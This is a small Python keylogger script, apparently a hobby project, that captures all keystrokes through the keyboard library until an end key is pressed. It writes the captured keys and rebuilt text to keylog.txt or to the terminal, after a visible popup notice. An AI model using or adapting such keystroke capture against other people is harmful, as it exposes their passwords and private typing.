""" A keylogger made by Calstar9000

Has some problems with double readings

Logs info to keylog.txt
"""

import tkinter.messagebox
import keyboard
import time
import tkinter
def log(list, string):
    with open('keylog.txt', 'a') as f:
        f.write(
                   ','
                 + '\n(' + 'Delivered at '
                 + str(time.ctime(time.time()))
                 + ': ' 
                 + str(list)
                 + ', '
                 + string
                 + ')'
                 )

def keyLog(endKey: str):
    tkinter.messagebox.showinfo('Keylog', f'Keylogging with endkey "{endKey}"! Logs will be in keylog.txt')
    keys = []
    keyStr = ''
    activeKey = ''
    prevKey = ''
    currentMillisecond = time.time() * 1000
    prevMillisecond = currentMillisecond
    while not keyboard.is_pressed(endKey):
        activeKey = keyboard.read_key()
        currentMillisecond = time.time() * 1000
        if (not ((activeKey == prevKey) and (currentMillisecond < (prevMillisecond + 300)))):
            keys.append(activeKey)
            prevMillisecond = currentMillisecond
            prevKey = activeKey
    # keys = keyboard.record('ctrl')
    for i in keys:
        if i == 'space':
            keyStr += ' '
        elif len(str(i)) > 1:
            pass
        else:
            keyStr += i
        log(keys, keyStr)
    return(str(keys) + ', ' + keyStr)
def keyLogPrint(endKey: str):
    tkinter.messagebox.showinfo('Keylog Print', f'Keylogging with endkey {endKey}! Output will be in terminal')
    keys = []
    keyStr = ''
    activeKey = ''
    prevKey = ''
    currentMillisecond = time.time() * 1000
    prevMillisecond = currentMillisecond
    while not keyboard.is_pressed(endKey):
        activeKey = keyboard.read_key()
        currentMillisecond = time.time() * 1000
        if (not ((activeKey == prevKey) and (currentMillisecond < (prevMillisecond + 300)))):
            keys.append(activeKey)
            prevMillisecond = currentMillisecond
            prevKey = activeKey
    # keys = keyboard.record('ctrl')
    for i in keys:
        if i == 'space':
            keyStr += ' '
        elif len(str(i)) > 1:
            pass
        else:
            keyStr += i
        print(f'{keys},  + {keyStr}')
    return(str(keys) + ', ' + keyStr)